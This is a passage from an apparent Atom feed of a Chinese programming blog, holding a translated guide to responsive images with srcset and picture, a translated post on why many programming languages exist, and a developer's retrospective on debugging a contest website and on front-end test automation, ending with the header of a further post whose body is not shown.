<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">sizes</span>=<span class="value">"(max-width: 380px) 100vw, 80vw"</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据这个逻辑，任何视口宽度小于等于 380px 的浏览器会让图片充满 100% 的视口。其他的浏览器则会导致 media query 返回 <code>false</code>，从而采用另外的值——在这个例子中，即 <code>80vw</code>。</p>
<p>一般说来（As a general rule），我对在 HTML 使用 media query 表示十分反感。只是因为响应式图片数据是属于 HTML 的（不是 Javascript），而 media query 却是属于 CSS 的（不是 HTML）。但是，如果你需要，这也不失为一个选择。</p>
<h2 id="响应式图片的最佳实践（2016？）">响应式图片的最佳实践（2016？）</h2><p>我不知道你是怎么想的，但我确实为 <code>srcset</code> 带来的改变感到兴奋。这是一个复杂问题的一个简单的解决方案，并且似乎提供了我们所需的所有东西。</p>
<p>但是，就像公交车一样，你为了响应式图片的官方解决方案等待了 20 年，而且一上场就有两个。除了 <code>img</code> 标签的 <code>srcset</code> 属性，我们还有 <code>picture</code> 标签。</p>
<p><code>picture</code> 标签是另外一种占位符——尽管（albeit）是较为传统的一种。它被设计为 HTML5 中 <code>audio</code> 和 <code>video</code> 标签的模仿者（mimic），因此，它的语法被大多数人所熟识。当你需要更多 <code>srcset</code> 不能提供的功能时，建议你使用 <code>picture</code>。</p>
<p>遗憾的是，<code>picture</code> 的浏览器支持比 <code>srcset</code> 更差，并且<strong>它不会静默失败</strong>。</p>
<h3 id="使用_picture">使用 picture</h3><p>这是图片的原始定义：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是一副嵌套在 <code>picture</code> 中的图片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 <code>picture</code> 标签中，我们也可以为 <code>img</code> 标签指定 <code>srcset</code> 属性：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用_source_标签">使用 source 标签</h3><p>在没有增加 <code>source</code> 标签时，<code>picture</code> 标签是死的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当选择所要展示的图片时，浏览器会从第一个 <code>source</code> 标签开始遍历，直到找到一个 <code>media</code> 值为 <code>true</code> 的 <code>source</code> 标签为止。该 <code>source</code> 标签的 <code>srcset</code> 属性将会被采用。</p>
<p>例如，我们可以为图片指定”肖像“（portrait）格式和”风景“格式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">media</span>=<span class="value">"orientation:landscape"</span> <span class="attribute">srcset</span>=<span class="value">"horizontal-image.jpg"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">media</span>=<span class="value">"orientation:portrait"</span> <span class="attribute">srcset</span>=<span class="value">"vertical-image.jpg"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>甚至，我们可以用 x 描述符 和 w 描述符 来指定多幅图片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">media</span>=<span class="value">"orientation:landscape"</span> <span class="attribute">srcset</span>=<span class="value">"retina-horizontal-image.jpg 2x, horizontal-image.jpg"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">media</span>=<span class="value">"orientation:portrait"</span> <span class="attribute">srcset</span>=<span class="value">"retina-vertical-image.jpg 2x, vertical-image.jpg"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 <code>sizes</code> 属性中使用 media query 时，我会质疑在 HTML 而不是在 CSS 中基于样式来控制图片的合理性。然而，如果你需要，<code>media</code> 属性也不失为一种选择。</p>
<h3 id="使用_type">使用 type</h3><p><code>picture</code> 标签真正厉害的地方，在于它能从不同的图片类型中作出选择。</p>
<p>想象我们现在有一张标准 PNG 图片，但我们想用 <a href="https://developers.google.com/speed/webp/?hl=en" target="_blank" rel="external">WebP</a> 格式去替换它，因为这会缩减 26% 的体积——记住，响应式图片的核心在于 用最小的数据量提供尽可能高质量的图片——然而目前它仅被 Chrome、Opera 和 Android 内置浏览器所支持。我们需要使用 <code>type</code> 属性来确定 <code>WebP</code> 格式是否被支持：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">type</span>=<span class="value">"image/webp"</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.webp 2x, image.webp 1x"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个案例中，浏览器会先检查是否支持 <code>WebP</code> 格式。如果是，它会继续判断屏幕是否有足够的像素密度去显示 <code>retina-image,webp</code> 图片，如果不是，则会显示 <code>image.webp</code> 。倘若 <code>WebP</code> 不被支持，浏览器将会径直跳至 <code>img</code> 标签处并解析——这部分我们已经非常熟悉了。</p>
<p><code>type</code> 属性的出现，意味着在环境支持的情况下，我们可以可以提供体积更小的图片格式。</p>
<h3 id="已知的问题">已知的问题</h3><p>在 IE9 中有一个已知的问题：<code>picture</code> 标签将不会静默失败。为了处理 IE9 的情况，你需要欺骗 IE9，让它以为 <code>source</code> 标签是 <code>video</code> 标签的一部分：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">!—[if</span> <span class="attribute">IE</span> <span class="attribute">9</span>]&gt;</span><span class="tag">&lt;<span class="title">video</span> <span class="attribute">style</span>=<span class="value">"display:none;"</span>&gt;</span><span class="tag">&lt;<span class="title">![endif]—</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">source</span> <span class="attribute">type</span>=<span class="value">"image/webp"</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.webp 2x, image.webp 1x"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">!—[if</span> <span class="attribute">IE</span> <span class="attribute">9</span>]&gt;</span><span class="tag">&lt;/<span class="title">video</span>&gt;</span><span class="tag">&lt;<span class="title">![endif]—</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">picture</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是一个丑陋的解决方案——但聊胜于无。我们只能期望 Windows10 的发布能够加速 IE9 退出市场，因为虽然 Edge 也不支持 <code>picture</code> 标签，但至少它会用正确的方式来处理（静默失败）。</p>
<p>当然，也有相应的 <a href="https://scottjehl.github.io/picturefill/" target="_blank" rel="external">polyfills</a> 来实现 IE 对 <code>picture</code> 的兼容，但我的建议是去避免它。我从来不信任用 Javascript 打补丁，因为这会极大地影响性能，同时也让代码变得不可维护。</p>
<p>出于这种原因，我建议现在还是最好不要使用 <code>picture</code> 标签。除非，你在运营一个大规模的电子商务网站，由 <code>WebP</code> 格式节省下来的下载时间实在不足以弥补因对代码打补丁所带来的不便。</p>
<p>一旦 IE9 的市场份额降至 1% 以下——也许发生在明年的某一个时刻（译者注：歪果仁的看法不代表天朝的实际情况），<code>picture</code> 标签就会变得可以接受（viable）。如果你在 2016 年读到这篇文章，或许，这种方案值得你去实践。</p>
<h2 id="创建_响应式图片">创建 响应式图片</h2><p>位图并不会自己放大——这点和 SVG 不一样。面对这个问题，我们的解决方法是：使用 <code>srcset</code> 或者是 <code>picture</code>，从而为不同能力的浏览器提供不同的图片。因此，我们需要提供许多种不同尺寸的图片。</p>
<p>许多图片编辑软件都实现了图片自动化多尺寸导出——无论使用何种软件，你都可以轻松获得各种尺寸的图片，而无需亲自逐一调整。</p>
<p>Adobe Photoshop 是一款事实上的（de facto）位图编辑器。尽管对于设计工作者而言，它并不是一个很好的选择，但不可否认的是——用它来设计图片确实是一种享受（smooth &amp; reliable）。在 Photoshop 中，多图输出的实现相对直接一些：</p>
<ol>
<li>打开图片，并将其放在一个独立的图层上。 <img src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_1.jpg" alt=""></li>
<li>将图层重命名为你要生成的文件的名字（包括扩展名）<img src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_2.jpg" alt=""></li>
<li>勾选 文件 -&gt; 生成 -&gt; 图片资源，然后 Photoshop 会在 PSD 文件旁生成一个新目录，其中有生成好的图片。</li>
<li>再次重命名图层，在每个文件名前加上对应的缩放尺寸。一旦图层被重命名，对应的图片便会自动生成，因此不必重复 步骤3。<img src="http://netdna.webdesignerdepot.com/uploads/2015/08/step_4.jpg" alt=""></li>
</ol>
<p><em>（图片版权归 <a href="http://www.freeimages.com/photo/bikes-1447404" target="_blank" rel="external">Philip Collier</a> 所有）</em></p>
<p>若想了解更多关于 使用 Photoshop 生成图片 的知识，请点击 (这里)[<a href="https://helpx.adobe.com/photoshop/using/generate-assets-layers.html)。" target="_blank" rel="external">https://helpx.adobe.com/photoshop/using/generate-assets-layers.html)。</a></p>
<p>基于这些图片，我们便可以给浏览器提供 5 种选择：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"bikes_3x.jpg 3x, bikes_2-5x.jpg 2.5x, bikes_2x.jpg 2x, bikes_1-5x.jpg 1.5x"</span> <span class="attribute">src</span>=<span class="value">"bikes_1x.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="结语">结语</h2><p><code>img</code> 标签已经度过了漫长的 20 个春秋——或者更精确地说，在伴着缺点（inadequate）缓慢行进了 18 年后，<code>img</code> 标签在最后的两年突然“奋起直追”，直到变成今天这个相对复杂（sophisticated）的样子。</p>
<p>当然最重要的是：<strong>我们找到了解决方案</strong>。</p>
<p>迄今为止，在 <code>srcset</code> 和 <code>picture</code> 这两个可选项中，前者的浏览器支持相对比较完善。如果你的网站已经完成了 95%，<code>srcset</code> 的高级特性及其简洁的实现将是你的不二之选。</p>
<p>如果你在运营一个庞大的电子商务网站，有成千上万的产品图片需要显示，最佳的实践便是使用 WebP 格式的图片——随着 <code>picture</code> 元素的支持被不断完善，这一切的付出都是值得的。</p>
<p>浏览器无法依据当前的网络状况来选择适合的图片——这是现有解决方案最大的缺点。这不是我们所能左右的。在当下，我们只能祈求“好马配好鞍”了。</p>
<p>用最小的尺寸提供最高质量的图片，终于成为了可能。这意味着：在不久的将来，我们将能拥抱（embrace）更好的用户体验。</p>
<p><em>（图片引用：<a href="http://www.shutterstock.com/pic-84977458.html" target="_blank" rel="external">mountains</a> &amp; <a href="http://www.shutterstock.com/pic-116864680.html" target="_blank" rel="external">devices</a>，来自 Shutterstock）</em></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>原文链接：<a href="http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/">戳这里</a></p>
</blockquote>
<p><img src="http://netdna.webdesignerdepot.com/uploads/2015/08/featured_images1.jpg" alt=""></p>
<p>Web 是一种可视化的媒体。绚丽的视觉效果，很大程度上离不开图片文件所作出的贡献。虽然（Whilst）其中的许多效果都可以用 CSS 和 内联 SVG 来实现，互联网上的许多站点仍需要图片文件。</p>
<p>从去年的统计来看，每个站点中，图片平均占了一半的页面体积，并且随着时间的推移，图片体积有持续增加的趋势；就 2014 年而言，图片的大小便增长了 <strong>21%</strong>。</p>
<p>与此同时，互联网终端的种类、数量也在增长。从 72 ppi（市场份额正在下降）到 600 ppi，不同设备的分辨率（resolution）有着天壤之别。</p>
<p>创建能在任何设备中都有着高质量的图片，其实再容易不过了——用 1000 ppi 的质量保存图片，然后就可以不用再理他了（译者注：原文是 call it a day）。生成的图片，即使是在分辨率最高的设备上查看也是十分清晰的（crisp）。但是，在图片质量提升的同时，图片文件的大小也会相应地增加。要知道，<strong>页面加载时间</strong>可是影响用户体验的<strong>首要因素</strong>——因此，保证站点能够及时地呈现在用户面前是我们义不容辞（incrumbent）的责任。高质量的图片，即使是在宽带环境下加载也要耗费几十秒，更不用说（let alone）是移动端的设备了——简直就是无法使用。</p>
<p>响应式图片的目的，不是要为设备提供尽可能高质量的图片（这一点，我们很容易做到），而是要为设备提供它所能支持的最高质量的图片，仅此而已（nothing more）。</p>
<p>从这篇指南中，你将了解到响应式图片的工作原理（what works），响应式图片仍然存在的问题和陷阱（pitfall），以及如何将响应式图片运用到网站中。</p>]]>
    
    </summary>
    
      <category term="web设计" scheme="http://hsfzxjy.github.io/tags/web%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="翻译" scheme="http://hsfzxjy.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【译】“为什么有这么多的编程语言？”]]></title>
    <link href="http://hsfzxjy.github.io//why-are-so-many-programming-languages/"/>
    <id>http://hsfzxjy.github.io//why-are-so-many-programming-languages/</id>
    <published>2015-09-17T16:00:00.000Z</published>
    <updated>2016-02-02T07:16:30.550Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>原文链接：<a href="http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/" target="_blank" rel="external">戳这里</a></p>
</blockquote>
<p>在过去的一周中，几位同事曾两次问了我这个问题。听起来，这像是一个糟糕的问题，但事实上并不是这样的。</p>
<p>最简短的答案就是：<strong>尽管我们并不需要这么多语言，但我们还是想要（want）它们</strong>。让我们再探索得更深一些吧。</p>
<a id="more"></a>
<h2 id="难道它们不都是一样的吗？">难道它们不都是一样的吗？</h2><p>某种意义上（In a sense），是的。创建一个网站，你可以使用 <code>Ruby</code>、<code>Java</code>、<code>Python</code>、<code>C#</code>、<code>Go</code> 抑或是 <code>Javascript</code>。甚至，你可以使用 <code>C</code> 或 <code>C++</code> 或 <code>Haskell</code> 或 <code>Rust</code> 或 <code>COBOL</code> 或 <code>Pascal</code> 或 <code>Perl</code>。</p>
<p>事实的背后就是：这些语言都有着同样的目的——把人类的思想转变成为计算机能够读懂的 1 和 0——用夸张的（highfalutin）的计算机术语来讲：它们都是 <a href="https://en.wikipedia.org/wiki/Turing_completeness" target="_blank" rel="external">图灵完备（Turing complete）</a> 的。</p>
<p>从底层上来看，这些语言都<strong>是</strong>完全一样的。但从表面（人类和它们交互的接口）上来看，它们却有很大的不同。这，便是人们关注的焦点了。</p>
<h2 id="不同的任务需要不同的工具">不同的任务需要不同的工具</h2><p>事实上，编程语言只是工具，而对于不同的任务，我们需要选择不同的工具。拖拉机（tractor trailer）、自行车、特斯拉汽车（Tesla）都是交通工具——它们都有轮子，有转向器（steering ?），并且都会将你从一个地方带到另一个地方——但显然，我们要将它们运用到不同的场景中。</p>
<p>编程语言也是类似的：若是要构建网站，<code>Ruby</code> 和 <code>Javascript</code> 是不错的选择；<code>Java</code> 和 <code>C++</code> 则常常被运用在金融领域；至于 <code>Python</code> 和 <code>R</code>，它们是统计分析的工具。</p>
<p>在语言的选择上，我们常常要从便捷程度、安全性和速度这几个方面进行权衡（trade-offs）——就像交通工具一样。通常来讲，需要根据手头上的工作视情况而定。</p>
<h2 id="开发者们有不同的“口味”（tastes）">开发者们有不同的“口味”（tastes）</h2><p>抛开纯粹的功能，开发者还会根据个人的“口味”来选择工具。</p>
<p>编程语言是人类向计算机<strong>表达</strong>想法的工具。尽管不同的开发者在许多方面都有相似之处，我们的思考方式仍存在着区别——这是自然所决定的。</p>
<p>由于有多种编程语言供我们选择，我们完全可以选择一种“以我们想要的方式工作”的语言。有的开发者喜欢<code>Ruby</code>的灵活性（flexibility），而另一些则喜欢<code>Java</code>的严谨（strictness）。同时，有些语言看上去和数学一样深奥，而另一些读起来却和散文一样（prose）。</p>
<h2 id="以人为本">以人为本</h2><p>业务是以人为本的。</p>
<p>撇开功能和个人“口味”，通常来说，你会选择一种你了解的，或是你周围的人了解的语言。</p>
<p>Stack Overflow 选择了 <code>C#</code>，很大程度上是因为团队的创始人了解它。其次（In turn），它也是为创始人的朋友和同事所了解的。<code>C#</code> 使招聘工作（recruiting）变得更加简单，同时也使 Stack Overflow 更快地进入市场。</p>
<p>（幸运的是，<code>C#</code> 同时也有着超棒的技术亮点）</p>
<p>一种技术需要一个“生态圈”（ecosystem）来支持——那便是能为每个有需要的开发者提供工具和帮助的社区（communities）和组织（organizations）。好的“生态圈”能让个人开发者更加成功——<code>Ruby</code> 就是个很好的例子。</p>
<h2 id="多样性就是力量">多样性就是力量</h2><p>总的来说，由于我们有着各种各样的任务，同时也有着各种各样的人在完成这些任务，我们才有了各种各样的编程语言。</p>
<p>而正是这种多样性的存在，使得许多有趣的程序，有趣的公司甚至是有趣的职业生涯，从不可能成为了可能。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>原文链接：<a href="http://blog.stackoverflow.com/2015/07/why-are-there-so-many-programming-languages/">戳这里</a></p>
</blockquote>
<p>在过去的一周中，几位同事曾两次问了我这个问题。听起来，这像是一个糟糕的问题，但事实上并不是这样的。</p>
<p>最简短的答案就是：<strong>尽管我们并不需要这么多语言，但我们还是想要（want）它们</strong>。让我们再探索得更深一些吧。</p>]]>
    
    </summary>
    
      <category term="翻译" scheme="http://hsfzxjy.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Wisecity 商赛总结——也谈前端自动化测试]]></title>
    <link href="http://hsfzxjy.github.io//wisecity-conclusion/"/>
    <id>http://hsfzxjy.github.io//wisecity-conclusion/</id>
    <published>2015-07-23T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<p>真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p>
<p>事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管 wisecity 已经举办了两届，尽管在此之前我已做过 4 个网站，尽管这次的网站是在上一届的基础上进行改造的，我的心里仍有些忐忑不安，害怕它会出什么问题——抑或是大会的工作人员操作不当导致网站崩溃云云（这事真的发生了）。5 天的 wisecity 大会，我都身在北京，身边没有电脑，没有解决问题的条件，因此需要一个有基本的编程能力的人协助我。5 天下来，问题还不少，调试的过程可谓是十分原始：接到问题后，囿于有限的条件，我只能通过翻看手机上的代码，在脑海中模拟并觉出问题所在，找到最小代价的改动方案，再将改动之处通过短信通知 cc——当然，很多时候并不那么顺利，我还需要跟多的信息帮助判断，比如错误日志，又比如进行特定操作时的表现（这个最坑爹，可遇而不可求）。我尽一切努力在脑海中想象着程序的流程，很累，但也很有挑战性。</p>
<p>第一天就遇到了一个棘手的问题：高伯在删除测试数据时不小心把管理员账号（admin）一起删掉了。这个消息从扬声器传出后，我足足沉默了一分钟，<br>心里像是有千万头草泥马奔过：</p>
<blockquote>
<p>怎么这么毛手毛脚？这下可好了，麻烦大了——虽然这个设计是有些不合理，但这不能怪我，django 已经封装好了（姜戈：怪我咯？）。快想办法快想办法……直接去后台加一个？不行不行，密码这块很难弄，MD5 + SHA1 + Salt，根本不是人能算的——只能让 django 自己产生一个用户了。嗯，我需要一个 MySQL，一个完整的 Python 开发环境，各种包……不知 cc 能不能应付过来。真是的一大早!@#$%^……<br><img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""> </p>
</blockquote>
<p>挂断电话，抄起手机噼里啪啦给 cc 发了一条短信，手把手教配置 MySQL，django，导出 SQL，上传数据库……吧啦吧啦洋洋洒洒几百字。发送时一直祈祷：但愿 cc 悟性高一些，不然真的完了——还好，半个小时后，前线传来了好消息：一切顺利。</p>
<p>总算是松了一口气，才发现，背已汗湿。</p>
<p>然而，事情还没有结束。</p>
<p>第二天一早，我又被告知：上传的文件下载不了（纳尼？走之前不是才作过测试吗）。点开文件看网址，发现原来是七牛的域名后面少了一个<code>/</code>，很快便处理好了。本以为可以好好玩一天了（那天出去玩），逛了大半个北京，夕阳西下时，却又接到一个 bug：选手列表只显示了 10 个用户，但应该有 40+ 个。</p>
<p>这个 bug，前后调了 2 个小时。从奥林匹克公园，到中关村——因为，我并不知道问题出在哪，一点也不知道。打 <code>console.log</code>，翻看网络记录（没错！在短信这种高时滞的通讯条件下！），最终发现，原来是 REST 返回的用户列表顺序反了，加载了最后 10 个，但由于用户没有明显的顺序标志，所以调试时没有察觉。改正之后，终于可以安心吃完饭——</p>
<p>谁知，两分钟后，短信又开始轰炸了：加载的用户列表有重复项！很多的重复项！！没有规律的重复项！！！</p>
<p>这个 bug，前后又调了 2 个小时。从中关村，再到人大附中，直到繁星爬满了苍穹。第一个反应是自制的瀑布流控件滚动事件并发处理没有做好。翻看源代码，似乎找到一处疑似有问题的地方，尝试让 cc 改了一下——半个小时后，传回了一个令人泄气的消息（中间配置<code>grunt</code>又耗费了好些功夫）。冥想了一个小时，前后端的代码都看遍了，就是没有发现问题，最终只得放弃，告诉高伯用一些奇技*巧避开重复项。直至回来后，静下心分析代码，才发现在一个不起眼的地方有一处笔误，这是重构 HFMUN 的瀑布流控件时产生的。</p>
<p>之后的几天，又有几个大大小小的 bug，抑或是需求改动，处理得还算顺利。可怕的是最后一天，KVDB 直接宕掉了——我整个缓存都是挂在 KVDB 上的，也怪当时没有作容灾处理，这个事件直接导致全站报 500 错误。急急忙忙关掉了缓存（还好做缓存时解了耦，只需改动两处即可），然后再质问 SAE，这些都是后话了。</p>
<p>然而，这里有个值得反思的问题：既然我已经作过 4 个网站，为何还是会有 bug 出现？从 HFMUN 1.0，到 wisecity 1.0，到 HFMUN 2.0，随着我技术的逐渐成熟，bug 出现的频率也在不断下降——但是 bug 仍在，就像“杀不死的小强”一样。</p>
<p>测试，关键还是在测试。</p>
<p>人的主观意识，受制于时空、环境等诸多因素，任何一个参数的改变都有可能影响主观能动性的发挥。因此，不能保证在任何时候人的意识都能正确地、高效地发挥作用。软件工程，作为人类纯意识的产物，其正确性并不能百分百地保证。或是精神不振引起的一处笔误，或是重构迁移时没有同步更改的一处配置，抑或是一处自己在开发过程中完全没有意识到的错误——设计归设计，程序是否能运行，还是电脑说了算。许多的 bug 就是这样产生的。</p>
<p>这个时候，单元测试（Unit Test）就显得非常重要了。通过分析需求而设计的测试样例，可以保证功能的相对正确性，即在能够考虑到的所有情况下，程序都能狗正常运行。这是重构（Refactory）过程中十分重要的一个环节，因为外部不变性是重构必须遵守的一个准则。</p>
<p>在软件工程的上古时代，测试常常是由人工来完成的。团队中，总有几名成员每天都在做着重复、机械的工作，即对新增的功能或是修改过的功能进行测试。这种测试机制费时费力，同时也不是非常有效——上面已经说过了，没有人能保证主观意识的正确性。后来，出现了基于脚本的批量测试，测试人员可以编写一小段代码对特定的功能进行校验，很大程度地提高了效率；再到今天的分布式测试，成熟的测试系统可以模拟多种不同的生产环境，检测到代码库的变化后，便会自动进行单元测试。这是单元测试的自动化进程。</p>
<p>今天的自动化测试固然很成熟，基本可以检测到各种逻辑错误。但在测试领域，却仍有一处令其束手无策的“禁地”——这便是 GUI 测试。综合分析 wisecity2.0 的 bugs，其中大部分都是前端出了问题。GUI 测试的麻烦在于：</p>
<ul>
<li>GUI 是一个输入与输出交替进行的系统，并且输入具有无限的可能，无法用有限的测试样例对输入进行覆盖。比如第二天发生的那个 bug 需要在“文件上传成功后，跳转到首页，点击下载链接”、“用户数量超过 10 个，在列表页面快速滚动鼠标滚轮”才能被触发。许多的 bug 只有在真实生产环境中被用户捕捉到。</li>
<li>GUI 的正确性没有一个绝对的判定标准。元素错位、颜色不正确，这些事件都不报错，但它们也是 bug，通常也只有人类认为它们是 bug。但它们的发生并不影响功能，只是用户体验（User Experience）不好——用户体验是一个纯主观的概念，至少在当下，计算机是不能理解的。</li>
</ul>
<p>目前，GUI 测试主要还是依赖人工。Facebook 就有一个庞大的测试人员系统，以模拟尽可能多的用户操作样例。诚然，业界已经开始出现一些 前端自动化测试框架，有如 selenium、phantomjs 等通过 mock 事件模拟用户操作，更有甚者如 PhantomCSS 可以对特定操作的结果进行像素比对，可软件的主观部分还是需要人脑来判断。</p>
<p>这是一个好时代，周围的一切都在飞快地变化着。希望在不久的将来，当人工智能出现时，这个问题能够有效地解决。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p>
<p>事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管]]>
    </summary>
    
      <category term="wisecity" scheme="http://hsfzxjy.github.io/tags/wisecity/"/>
    
      <category term="前端" scheme="http://hsfzxjy.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="前端自动化测试，总结" scheme="http://hsfzxjy.github.io/tags/%E5%89%8D%E7%AB%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="单元测试" scheme="http://hsfzxjy.github.io/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记一次 DoS 诈骗网站的经历]]></title>
    <link href="http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/"/>
    <id>http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/</id>
    <published>2015-07-23T16:00:00.000Z</published>
    <updated>2016-02-02T13:30:35.450Z</updated>
